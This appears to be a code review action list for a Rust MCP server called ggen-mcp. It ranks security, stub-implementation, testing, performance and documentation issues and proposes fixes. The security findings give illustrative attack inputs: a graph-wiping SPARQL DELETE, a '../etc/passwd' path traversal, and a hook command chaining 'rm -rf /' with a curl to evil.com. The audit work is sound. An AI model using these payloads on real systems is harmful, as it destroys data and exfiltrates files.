# Code Review Action Items - ggen-mcp

**Generated:** 2025-10-10
**Priority Legend:** P0 (Critical/Blocker) | P1 (High) | P2 (Medium) | P3 (Low)

---

## P0 - CRITICAL BLOCKERS (Fix Immediately)

These issues MUST be resolved before any production deployment.

### SECURITY-001: SPARQL Injection Vulnerability
**File:** `src/tools/graph.rs:5`
**Severity:** CRITICAL
**Risk:** Database manipulation, data exfiltration

**Issue:**
```rust
pub async fn query(params: Value) -> Result<Value> {
    let sparql = get_string_param(&params, "sparql")?;  // No validation!
    // Direct use allows arbitrary SPARQL operations
}
```

**Attack Example:**
```sparql
DELETE WHERE { ?s ?p ?o }  -- Deletes entire graph
```

**Required Fix:**
1. Implement SPARQL query parser
2. Whitelist allowed operations (SELECT, CONSTRUCT)
3. Blacklist dangerous operations (DELETE, DROP, INSERT)
4. Add query complexity limits
5. Add timeout enforcement

**Effort:** 2-3 days
**Assigned To:** Security Team

---

### SECURITY-002: Path Traversal Vulnerability
**Files:**
- `src/tools/graph.rs:31` (load function)
- `src/tools/template.rs:6` (create function)
**Severity:** CRITICAL
**Risk:** Arbitrary file read/write access

**Issue:**
```rust
let file = get_string_param(&params, "file")?;  // Could be "../../etc/passwd"
```

**Attack Example:**
```json
{"file": "../../../etc/passwd"}
```

**Required Fix:**
```rust
use std::path::{Path, PathBuf};

fn validate_file_path(path: &str, base_dir: &Path) -> Result<PathBuf> {
    let path = PathBuf::from(path);
    let canonical = path.canonicalize()
        .map_err(|_| GgenMcpError::InvalidParameter("Invalid path"))?;

    if !canonical.starts_with(base_dir) {
        return Err(GgenMcpError::SecurityViolation("Path traversal attempt"));
    }

    Ok(canonical)
}
```

**Effort:** 1 day
**Assigned To:** Security Team

---

### SECURITY-003: Command Injection in Hook Registration
**File:** `src/tools/hook.rs:7`
**Severity:** CRITICAL
**Risk:** Arbitrary code execution

**Issue:**
```rust
let command = get_string_param(&params, "command")?;  // Unvalidated shell command
```

**Attack Example:**
```json
{
  "event": "post_gen",
  "command": "rm -rf / & curl evil.com/steal"
}
```

**Required Fix:**
1. Parse commands instead of raw strings
2. Whitelist allowed commands
3. Use `std::process::Command` with args, not shell execution
4. Implement command sanitization

```rust
fn validate_hook_command(command: &str) -> Result<ValidatedCommand> {
    const ALLOWED_COMMANDS: &[&str] = &["git", "cargo", "npm", "docker"];

    let parts: Vec<&str> = command.split_whitespace().collect();
    let cmd = parts.first()
        .ok_or(GgenMcpError::InvalidParameter("Empty command"))?;

    if !ALLOWED_COMMANDS.contains(cmd) {
        return Err(GgenMcpError::SecurityViolation("Command not allowed"));
    }

    Ok(ValidatedCommand { cmd: cmd.to_string(), args: parts[1..].to_vec() })
}
```

**Effort:** 2 days
**Assigned To:** Security Team

---

### IMPL-001: All Tool Implementations Are Stubs
**Files:** All files in `src/tools/`
**Severity:** BLOCKER
**Risk:** Non-functional software

**Issue:**
```rust
// TODO: Replace with actual ggen-core API call
let result = json!({ "status": "completed" });  // Fake response
```

**Required Fix:**
Integrate with actual ggen-core functionality for all 20 tools:
- `project::gen` - Call actual template engine
- `market::search` - Query real marketplace API
- `graph::query` - Execute real SPARQL queries
- All other tools

**Effort:** 2-3 weeks
**Assigned To:** Core Development Team

---

### ERROR-001: Missing Error Handling for I/O Operations
**Files:** All tool implementations
**Severity:** BLOCKER
**Risk:** Unhandled panics, poor user experience

**Issue:**
All file/network operations lack proper error handling:
- No timeout handling
- No retry logic
- No graceful degradation
- Async I/O used synchronously

**Required Fix:**
```rust
use tokio::time::timeout;
use std::time::Duration;

pub async fn load(params: Value) -> Result<Value> {
    let file = validate_file_path(&get_string_param(&params, "file")?)?;

    let content = timeout(Duration::from_secs(30),
        tokio::fs::read_to_string(file)
    )
    .await
    .map_err(|_| GgenMcpError::ExecutionFailed("File read timeout"))?
    .map_err(|e| GgenMcpError::ExecutionFailed(format!("IO error: {}", e)))?;

    // Process content...
}
```

**Effort:** 1 week
**Assigned To:** Core Development Team

---

## P1 - HIGH PRIORITY (Required for Production)

### SECURITY-004: No Rate Limiting
**Files:** All tool endpoints
**Severity:** HIGH
**Risk:** DoS attacks, resource exhaustion

**Issue:**
No rate limiting on any operations. Attacker can spam requests.

**Required Fix:**
```rust
use governor::{Quota, RateLimiter};
use std::num::NonZeroU32;

static RATE_LIMITER: Lazy<RateLimiter<...>> = Lazy::new(|| {
    RateLimiter::direct(Quota::per_second(NonZeroU32::new(10).unwrap()))
});

async fn call_tool(&self, params: CallToolRequestParam) -> Result<...> {
    RATE_LIMITER.check().map_err(|_| ErrorData::rate_limited())?;
    // ... rest of implementation
}
```

**Dependencies:** Add `governor = "0.6"` to Cargo.toml
**Effort:** 2 days
**Assigned To:** Security Team

---

### SECURITY-005: Information Disclosure in Error Messages
**File:** `src/server.rs:303`
**Severity:** HIGH
**Risk:** Leaks internal implementation details

**Issue:**
```rust
.map_err(|e| ErrorData::internal_error(e.to_string(), None))?;
// Exposes full error including paths, internal state
```

**Required Fix:**
```rust
.map_err(|e| {
    tracing::error!("Internal error: {:?}", e);  // Log full error
    ErrorData::internal_error("Operation failed".to_string(), None)  // Generic to client
})?;
```

**Effort:** 1 day
**Assigned To:** Security Team

---

### SECURITY-006: Missing Resource Limits
**Files:** Multiple
**Severity:** HIGH
**Risk:** Resource exhaustion, DoS

**Issues:**
- No max limit on search results (market.rs:11)
- No query complexity limits (graph.rs)
- No file size limits (graph.rs:31, template.rs:6)
- No memory limits for operations

**Required Fix:**
```rust
const MAX_SEARCH_RESULTS: usize = 100;
const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024;  // 10MB
const MAX_QUERY_DEPTH: usize = 5;

let limit = params.limit.min(MAX_SEARCH_RESULTS);

let file_size = tokio::fs::metadata(&path).await?.len();
if file_size > MAX_FILE_SIZE {
    return Err(GgenMcpError::InvalidParameter("File too large"));
}
```

**Effort:** 2 days
**Assigned To:** Security Team

---

### PERF-001: No Connection Pooling for Registry
**Files:** `src/tools/market.rs` (multiple functions)
**Severity:** HIGH
**Impact:** Severe performance degradation

**Issue:**
```rust
// Line 19, 182, 529 - Creates new Registry on EVERY request
let registry = Arc::new(Registry::new()?);
```

**Impact:**
- File system thrashing
- Initialization overhead on every call
- Potential file descriptor exhaustion
- 5-10x slower than necessary

**Required Fix:**
```rust
use once_cell::sync::Lazy;

static REGISTRY: Lazy<Arc<Registry>> = Lazy::new(|| {
    Arc::new(Registry::new().expect("Failed to initialize registry"))
});

pub async fn list(params: Value) -> Result<Value> {
    let packages = REGISTRY.list_packages()?;  // Reuse singleton
    // ...
}
```

**Dependencies:** Add `once_cell = "1"` to Cargo.toml
**Effort:** 1 day
**Assigned To:** Performance Team

---

### PERF-002: Blocking I/O in Async Functions
**Files:** `src/tools/graph.rs`, `src/tools/template.rs`
**Severity:** HIGH
**Impact:** Blocks async runtime, degrades concurrency

**Issue:**
```rust
pub async fn load(params: Value) -> Result<Value> {
    // TODO: This would use std::fs::read_to_string (blocking!)
}
```

**Required Fix:**
```rust
use tokio::fs;

pub async fn load(params: Value) -> Result<Value> {
    let content = fs::read_to_string(validated_path).await?;  // Async I/O
    // ...
}
```

**Effort:** 1 day
**Assigned To:** Performance Team

---

### TEST-001: No Integration Tests
**Files:** None (missing)
**Severity:** HIGH
**Risk:** Protocol compliance issues, production failures

**Issue:**
Zero integration tests verifying:
- MCP protocol compliance
- JSON-RPC message handling
- Tool execution end-to-end
- Error propagation

**Required Fix:**
Create `tests/integration/` directory with tests:

```rust
// tests/integration/mcp_protocol_test.rs
#[tokio::test]
async fn test_initialize_handshake() {
    let server = GgenMcpServer::new();
    let init_params = InitializeRequestParam { ... };
    let result = server.initialize(init_params).await;
    assert!(result.is_ok());
    assert_eq!(result.unwrap().protocol_version, ProtocolVersion::default());
}

#[tokio::test]
async fn test_list_tools_returns_all_tools() {
    let server = GgenMcpServer::new();
    let result = server.list_tools(None).await.unwrap();
    assert_eq!(result.tools.len(), 20);  // Should have all 20 tools
}

#[tokio::test]
async fn test_call_tool_with_invalid_name() {
    let server = GgenMcpServer::new();
    let params = CallToolRequestParam {
        name: "nonexistent_tool".into(),
        arguments: None,
    };
    let result = server.call_tool(params).await;
    assert!(result.is_err());
}
```

**Effort:** 1 week
**Assigned To:** QA Team

---

### TEST-002: Stub-Only Tests Don't Verify Behavior
**Files:** All `#[cfg(test)]` modules
**Severity:** HIGH
**Risk:** False confidence in code quality

**Issue:**
```rust
#[tokio::test]
async fn test_list_templates() {
    let params = json!({});
    let result = list(params).await;
    assert!(result.is_ok());  // Only checks it doesn't panic!
}
```

**Required Fix:**
Test actual behavior with test doubles:

```rust
#[tokio::test]
async fn test_market_search_filters_by_category() {
    let params = json!({
        "query": "auth",
        "category": "security",
        "limit": 5
    });

    let result = search(params).await.unwrap();
    let data = result["data"].as_object().unwrap();
    let results = data["results"].as_array().unwrap();

    assert!(results.len() <= 5);
    for item in results {
        assert_eq!(item["category"], "security");
        assert!(item["name"].as_str().unwrap().contains("auth") ||
                item["description"].as_str().unwrap().contains("auth"));
    }
}
```

**Effort:** 1 week
**Assigned To:** QA Team

---

### DOC-001: Missing API Documentation
**Files:** All public APIs in `src/`
**Severity:** HIGH
**Impact:** Developer confusion, incorrect usage

**Issue:**
0% rustdoc coverage. No examples, no usage guidance.

**Required Fix:**
Add comprehensive rustdoc to all public items:

```rust
/// MCP server that exposes ggen functionality through the Model Context Protocol.
///
/// This server provides 20 tools across 5 categories:
/// - **Project Tools**: Generate, plan, apply, diff
/// - **Market Tools**: List, search, install packages
/// - **Graph Tools**: Query, load, export RDF data
/// - **Template Tools**: Create, validate templates
/// - **Hook Tools**: Register lifecycle hooks
///
/// # Example
///
/// ```no_run
/// use ggen_mcp::GgenMcpServer;
/// use rmcp::ServerBuilder;
///
/// #[tokio::main]
/// async fn main() -> anyhow::Result<()> {
///     let server = GgenMcpServer::new();
///     ServerBuilder::new(server)
///         .stdio()
///         .serve()
///         .await?;
///     Ok(())
/// }
/// ```
///
/// # Architecture
///
/// The server uses a registry-based tool system where each tool is:
/// 1. Registered with a JSON schema describing its parameters
/// 2. Mapped to an async handler function
/// 3. Executed via the MCP protocol's `tools/call` method
///
/// # Error Handling
///
/// All errors are converted to [`rmcp::ErrorData`] for protocol compliance.
/// Internal errors are logged but sanitized before sending to clients.
pub struct GgenMcpServer {
    /// Registry of available tools with their schemas
    tools: HashMap<String, ToolDef>,
}
```

**Effort:** 3-4 days
**Assigned To:** Documentation Team

---

### DOC-002: Missing Architecture Documentation
**Files:** None (create `docs/ARCHITECTURE.md`)
**Severity:** HIGH
**Impact:** Difficult onboarding, maintenance challenges

**Required:**
Create comprehensive architecture documentation:

```markdown
# Architecture

## System Overview
[High-level diagram]

## Component Diagram
[Components and relationships]

## Data Flow
[Request/response flow]

## Error Handling Strategy
[Error propagation patterns]

## Security Model
[Authentication, authorization, validation]

## Performance Considerations
[Caching, pooling, async patterns]
```

**Effort:** 2 days
**Assigned To:** Documentation Team

---

## P2 - MEDIUM PRIORITY (Should Fix Soon)

### ARCH-001: Refactor market.rs (Too Large)
**File:** `src/tools/market.rs`
**Severity:** MEDIUM
**Impact:** Maintainability

**Issue:**
826 lines in single file. Should be split into:
- `market/core.rs` - List, search, install
- `market/recommendations.rs` - Recommendation engine
- `market/cache.rs` - Cache operations
- `market/scoring.rs` - Health/relevance scoring
- `market/sync.rs` - Sync operations

**Effort:** 2-3 days

---

### ARCH-002: Implement Trait-Based Tool System
**File:** `src/server.rs`
**Severity:** MEDIUM
**Impact:** Extensibility, testability

**Issue:**
Hardcoded tool dispatch limits extensibility.

**Required:**
```rust
#[async_trait]
pub trait Tool: Send + Sync {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    fn schema(&self) -> Value;
    async fn execute(&self, params: Value) -> Result<Value>;
}

pub struct ToolRegistry {
    tools: HashMap<String, Arc<dyn Tool>>,
}

impl ToolRegistry {
    pub fn register<T: Tool + 'static>(&mut self, tool: T) {
        self.tools.insert(tool.name().to_string(), Arc::new(tool));
    }
}
```

**Benefits:**
- Plugin architecture
- Better testing (mock tools)
- Dynamic tool registration
- Cleaner separation of concerns

**Effort:** 3-4 days

---

### ARCH-003: Implement Builder Pattern for Server
**File:** `src/server.rs`
**Severity:** MEDIUM
**Impact:** Configuration flexibility

**Current:**
```rust
let server = GgenMcpServer::new();  // No configuration options
```

**Proposed:**
```rust
let server = GgenMcpServer::builder()
    .with_project_tools()
    .with_market_tools()
    .with_graph_tools()
    .with_rate_limit(10)
    .with_timeout(Duration::from_secs(30))
    .build()?;
```

**Effort:** 2 days

---

### PERF-003: Implement Caching Layer
**Files:** `src/tools/market.rs`
**Severity:** MEDIUM
**Impact:** 2-3x performance improvement

**Issue:**
Market search recalculates scores every time:

```rust
// Calculated on every search
fn calculate_relevance_score(package: &PackageInfo, query: &str) -> f32 {
    // String operations repeated unnecessarily
}
```

**Required Fix:**
```rust
use moka::future::Cache;

static SEARCH_CACHE: Lazy<Cache<String, Vec<Value>>> = Lazy::new(|| {
    Cache::builder()
        .max_capacity(1000)
        .time_to_live(Duration::from_secs(300))
        .build()
});

pub async fn search(params: Value) -> Result<Value> {
    let cache_key = format!("{:?}", params);

    if let Some(cached) = SEARCH_CACHE.get(&cache_key) {
        return Ok(success_response(json!({ "results": cached, "cached": true })));
    }

    // Perform search...
    SEARCH_CACHE.insert(cache_key, results.clone()).await;
    Ok(success_response(results))
}
```

**Dependencies:** Add `moka = "0.12"` to Cargo.toml
**Effort:** 2 days

---

### PERF-004: Optimize String Allocations
**Files:** Multiple
**Severity:** MEDIUM
**Impact:** Reduced memory pressure

**Issue:**
Excessive string cloning in hot paths:

```rust
// error.rs:46
.map(|s| s.to_string())  // Unnecessary allocation
```

**Fix:**
Use `Cow` or return `&str` where possible:

```rust
pub fn get_string_param<'a>(params: &'a Value, key: &str) -> Result<&'a str> {
    params.get(key)
        .and_then(|v| v.as_str())
        .ok_or_else(|| GgenMcpError::MissingParameter(key.into()))
}
```

**Effort:** 1 day

---

### PERF-005: Use Partial Sorting
**File:** `src/tools/market.rs:58`
**Severity:** MEDIUM
**Impact:** Faster search with limits

**Issue:**
```rust
filtered_packages.sort_by(...);  // Sorts entire list
if filtered_packages.len() > limit {
    filtered_packages.truncate(limit);  // Only needed top N
}
```

**Fix:**
```rust
use std::cmp::Reverse;

filtered_packages.select_nth_unstable_by(limit, |a, b| {
    // Only sorts enough to get top N
});
let top_n = &filtered_packages[..limit];
```

**Effort:** 1 day

---

### TEST-003: Add Property-Based Tests
**Files:** Create `tests/property/`
**Severity:** MEDIUM
**Impact:** Better edge case coverage

**Required:**
```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn test_schema_validation_never_panics(input: Value) {
        let _ = validate_schema(&input);  // Should never panic
    }

    #[test]
    fn test_search_query_handling(query: String) {
        prop_assume!(!query.is_empty());
        let params = json!({"query": query});
        let result = block_on(search(params));
        prop_assert!(result.is_ok() || matches!(result, Err(GgenMcpError::InvalidParameter(_))));
    }
}
```

**Dependencies:** Add `proptest = "1"` to Cargo.toml
**Effort:** 2 days

---

### TEST-004: Add Benchmark Suite
**Files:** Create `benches/`
**Severity:** MEDIUM
**Impact:** Performance regression detection

**Required:**
```rust
use criterion::{black_box, criterion_group, criterion_main, Criterion};

fn bench_market_search(c: &mut Criterion) {
    let runtime = tokio::runtime::Runtime::new().unwrap();

    c.bench_function("market_search_auth", |b| {
        b.iter(|| {
            runtime.block_on(async {
                let params = json!({"query": "auth", "limit": 10});
                search(black_box(params)).await
            })
        })
    });
}

criterion_group!(benches, bench_market_search);
criterion_main!(benches);
```

**Dependencies:** Add `criterion = "0.5"` to Cargo.toml
**Effort:** 2 days

---

### RUST-001: Reduce Unnecessary String Allocations
**Files:** Multiple
**Severity:** MEDIUM
**Impact:** Performance, memory usage

**Pattern to fix:**
```rust
// Bad
.unwrap_or_else(|| "default".to_string())

// Good
.unwrap_or("default")
```

**Locations:**
- error.rs:46
- market.rs:13, 173
- graph.rs:33, 53
- project.rs:79

**Effort:** 2 hours

---

### RUST-002: Add const for Magic Values
**Files:** Multiple
**Severity:** MEDIUM
**Impact:** Maintainability

**Issue:**
Magic values scattered throughout code:

```rust
// market.rs:379 - Should be const
let common_terms = ["authentication", ...];

// market.rs:11 - Should be const
.unwrap_or(20)
```

**Fix:**
```rust
const DEFAULT_SEARCH_LIMIT: usize = 20;
const MAX_SEARCH_LIMIT: usize = 100;
const COMMON_SEARCH_TERMS: &[&str] = &["authentication", ...];
```

**Effort:** 1 hour

---

### RUST-003: Use Iterator Chains
**File:** `src/tools/market.rs`
**Severity:** MEDIUM
**Impact:** Readability, performance

**Convert imperative loops to functional style:**

```rust
// Before: imperative
let mut tag_counts = HashMap::new();
for pkg in packages {
    for tag in &pkg.tags {
        *tag_counts.entry(tag.clone()).or_insert(0) += 1;
    }
}

// After: functional
let tag_counts = packages.iter()
    .flat_map(|pkg| &pkg.tags)
    .fold(HashMap::new(), |mut acc, tag| {
        *acc.entry(tag.clone()).or_insert(0) += 1;
        acc
    });
```

**Effort:** 2 hours

---

### RUST-004: Encapsulate Public Fields
**File:** `src/server.rs:18`
**Severity:** MEDIUM
**Impact:** API stability

**Issue:**
```rust
pub struct ToolDef {
    pub name: String,         // Direct field access
    pub description: String,
    pub input_schema: Value,
}
```

**Fix:**
```rust
pub struct ToolDef {
    name: String,
    description: String,
    input_schema: Value,
}

impl ToolDef {
    pub fn new(name: String, description: String, schema: Value) -> Self { ... }
    pub fn name(&self) -> &str { &self.name }
    pub fn description(&self) -> &str { &self.description }
    pub fn schema(&self) -> &Value { &self.input_schema }
}
```

**Effort:** 1 hour

---

## P3 - LOW PRIORITY (Nice to Have)

### FEAT-001: Implement Plugin Architecture
**Severity:** LOW
**Impact:** Extensibility

Allow third-party tool registration without modifying core code.

**Effort:** 1 week

---

### FEAT-002: Add Metrics/Observability
**Severity:** LOW
**Impact:** Production monitoring

Integrate Prometheus metrics:
- Request count per tool
- Request duration
- Error rates
- Cache hit rates

**Dependencies:** Add `prometheus = "0.13"` to Cargo.toml
**Effort:** 2-3 days

---

### FEAT-003: Add Fuzzing Tests
**Severity:** LOW
**Impact:** Security hardening

Use cargo-fuzz to discover edge cases:

```rust
#[cfg(fuzzing)]
fuzz_target!(|data: &[u8]| {
    if let Ok(value) = serde_json::from_slice(data) {
        let _ = validate_schema(&value);
    }
});
```

**Effort:** 2 days

---

### PERF-006: Implement Request Coalescing
**Severity:** LOW
**Impact:** Reduced duplicate work

Coalesce duplicate concurrent requests to same tool with same params.

**Effort:** 2 days

---

### DOC-003: Add CHANGELOG.md
**Severity:** LOW
**Impact:** Version tracking

Document changes between versions following Keep a Changelog format.

**Effort:** 1 hour

---

### DOC-004: Create Examples Directory
**Severity:** LOW
**Impact:** Developer experience

Add `examples/` with:
- Basic server usage
- Custom tool registration
- Error handling patterns
- Testing patterns

**Effort:** 1 day

---

## Summary Statistics

| Priority | Count | Total Effort |
|----------|-------|--------------|
| P0 | 5 | 3-4 weeks |
| P1 | 10 | 2-3 weeks |
| P2 | 13 | 2-3 weeks |
| P3 | 7 | 1-2 weeks |
| **Total** | **35** | **8-12 weeks** |

## Issue Categories

| Category | Count |
|----------|-------|
| Security | 6 |
| Performance | 6 |
| Testing | 4 |
| Architecture | 3 |
| Documentation | 4 |
| Rust Idioms | 4 |
| Implementation | 1 |
| Error Handling | 1 |
| Features | 6 |

## Recommended Sprint Plan

### Sprint 1 (Week 1-2): Security Critical
- SECURITY-001: SPARQL injection
- SECURITY-002: Path traversal
- SECURITY-003: Command injection
- SECURITY-004: Rate limiting
- SECURITY-005: Error sanitization
- SECURITY-006: Resource limits

### Sprint 2 (Week 3-4): Core Implementation
- IMPL-001: Replace all stubs
- ERROR-001: Error handling
- PERF-001: Connection pooling
- PERF-002: Async I/O

### Sprint 3 (Week 5-6): Testing & Docs
- TEST-001: Integration tests
- TEST-002: Behavior tests
- DOC-001: API documentation
- DOC-002: Architecture docs

### Sprint 4 (Week 7-8): Refactoring & Optimization
- ARCH-001: Refactor market.rs
- ARCH-002: Trait-based tools
- PERF-003: Caching layer
- RUST-001-004: Rust idioms

---

**Next Review:** Schedule after Sprint 2 completion to validate P0/P1 fixes.

**Contact:**
- Security issues: security@ggen.dev
- Performance issues: perf@ggen.dev
- General issues: dev@ggen.dev
